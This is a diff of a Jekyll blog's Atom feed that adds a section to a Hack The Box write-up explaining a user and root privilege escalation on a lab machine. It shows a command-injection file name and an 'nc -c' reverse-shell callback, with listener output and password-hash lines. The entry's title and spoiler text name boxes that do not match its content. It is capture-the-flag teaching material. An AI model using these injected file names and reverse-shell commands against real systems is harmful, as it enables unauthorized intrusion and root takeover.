@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2022-06-30T12:23:49-07:00</updated><id>/feed.xml</id><title type="html">Alex Loney</title><subtitle>Computer programming, cyber security, and baking! This blog has it all!</subtitle><author><name>Alex Loney</name></author><entry><title type="html">HTB: Dynstr Writeup</title><link href="/blog/writeup/htb/htb-dynstr/" rel="alternate" type="text/html" title="HTB: Dynstr Writeup" /><published>2021-06-17T23:36:00-07:00</published><updated>2021-06-17T23:36:00-07:00</updated><id>/blog/writeup/htb/htb-dynstr</id><content type="html" xml:base="/blog/writeup/htb/htb-dynstr/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2022-06-30T16:14:22-07:00</updated><id>/feed.xml</id><title type="html">Alex Loney</title><subtitle>Computer programming, cyber security, and baking! This blog has it all!</subtitle><author><name>Alex Loney</name></author><entry><title type="html">HTB: Dynstr Writeup</title><link href="/blog/writeup/htb/htb-dynstr/" rel="alternate" type="text/html" title="HTB: Dynstr Writeup" /><published>2021-06-17T23:36:00-07:00</published><updated>2021-06-17T23:36:00-07:00</updated><id>/blog/writeup/htb/htb-dynstr</id><content type="html" xml:base="/blog/writeup/htb/htb-dynstr/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
 
 &lt;hr /&gt;
 
@@ -432,7 +432,62 @@ root:&lt;span class=&quot;nv&quot;&gt;$6$wRmoL66y$Lz9oA82o1iDwKwJjhUwuGhuOakrYdc
 guly:&lt;span class=&quot;nv&quot;&gt;$6$eKNFoPNC$HlNBvdf0mFXswJ7xRZFaBQgfo0gR626ui&lt;/span&gt;/1rydhlIih/PEqDI8ZsrHUsET1y93GtydanJBwl82eGO8Iw0JJM90:18079:0:99999:7:::
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;And that’s it, we’re now root.&lt;/p&gt;</content><author><name>Alex Loney</name></author><category term="blog" /><category term="writeup" /><category term="htb" /><category term="htb" /><category term="htb easy" /><category term="offsec" /><summary type="html">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</summary></entry><entry><title type="html">HTB: Knife Writeup</title><link href="/blog/writeup/htb/htb-knife/" rel="alternate" type="text/html" title="HTB: Knife Writeup" /><published>2021-06-13T23:14:00-07:00</published><updated>2021-06-13T23:14:00-07:00</updated><id>/blog/writeup/htb/htb-knife</id><content type="html" xml:base="/blog/writeup/htb/htb-knife/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
+&lt;p&gt;And that’s it, we’re now root.&lt;/p&gt;
+
+&lt;h1 id=&quot;proper-privesc---user&quot;&gt;Proper Privesc - User&lt;/h1&gt;
+&lt;p&gt;This is the correct/expected way to become root before more vulnerabilites were discovered after this machine was released.&lt;/p&gt;
+
+&lt;p&gt;From the apache access, we will discover a script in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/guly&lt;/code&gt; labled &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check_attack.php&lt;/code&gt; and a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crontab.guly&lt;/code&gt; which implies that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check_attack.php&lt;/code&gt; script is executed once every 3 minutes. Looking at the script, we can see that it loops over all files in the directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/uploads/&lt;/code&gt; and if the file is invalid, it will consider it an “attack”, which attempts to remove it with the following line:&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;nohup /bin/rm -f &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$path$value&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This simply take the filename (as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$value&lt;/code&gt;) and passes that on to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec&lt;/code&gt;. The vulnerability here is that we can control the filenames, so if we create a filename that can be injected into this script, it will execute it.&lt;/p&gt;
+
+&lt;p&gt;To exploit this, we will create a file that begins with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; character, which is a command delimiter. Thus the first command will execute (and fail due to the file not existing) and the next command will then execute, in this case it’s our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; command to send a reverse shell.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/www/html/uploads
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;;nc -c bash 10.10.14.5 8081;&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We are then able to catch the reverse shell:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 8081
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 8081 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.5] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.146] 38476
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;proper-privesc---root&quot;&gt;Proper Privesc - Root&lt;/h1&gt;
+&lt;p&gt;As the user, we can see that we’re able to execute a script with sudo&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+User guly may run the following commands on networked:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/local/sbin/changename.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Taking a look at that script, it writes into a network file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/sysconfig/network-scripts/ifcfg-guly&lt;/code&gt;, then attempts to start it. There is a vulnerability in the way RHEL (and thus CentOS) handles this where it will simply source the file as root. When you source the file, you execute everything in the file, &lt;a href=&quot;https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;amp;qid=e026a0c5f83df4fd532442e1324ffa4f&quot;&gt;see here for a description of this&lt;/a&gt;. Thus, the way to exploit this is to insert a command into the script that sends a reverse shell back to us as root.&lt;/p&gt;
+
+&lt;p&gt;There is a regex match preventing some special characters from being used, most notibly the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.&lt;/code&gt; character can’t be used. To bypass this, I created a script that may be executed, then call the script from the file.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt; &amp;gt; /tmp/shell
+&amp;gt; /usr/bin/nc -c 10.10.14.5 8081
+&amp;gt; EOF
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;chmod a+x /tmp/shell
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;sudo /usr/local/sbin/changename.sh
+interface NAME:
+/bin/bash /tmp/shell
+interface PROXY_METHOD:
+test
+interface BROWSER_ONLY:
+test
+interface BOOTPROTO:
+test
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then set up a listener for the callback.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 8081                                       
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 8081 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.5] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.146] 43700
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Alex Loney</name></author><category term="blog" /><category term="writeup" /><category term="htb" /><category term="htb" /><category term="htb easy" /><category term="offsec" /><summary type="html">There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</summary></entry><entry><title type="html">HTB: Knife Writeup</title><link href="/blog/writeup/htb/htb-knife/" rel="alternate" type="text/html" title="HTB: Knife Writeup" /><published>2021-06-13T23:14:00-07:00</published><updated>2021-06-13T23:14:00-07:00</updated><id>/blog/writeup/htb/htb-knife</id><content type="html" xml:base="/blog/writeup/htb/htb-knife/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
 
 &lt;hr /&gt;
 
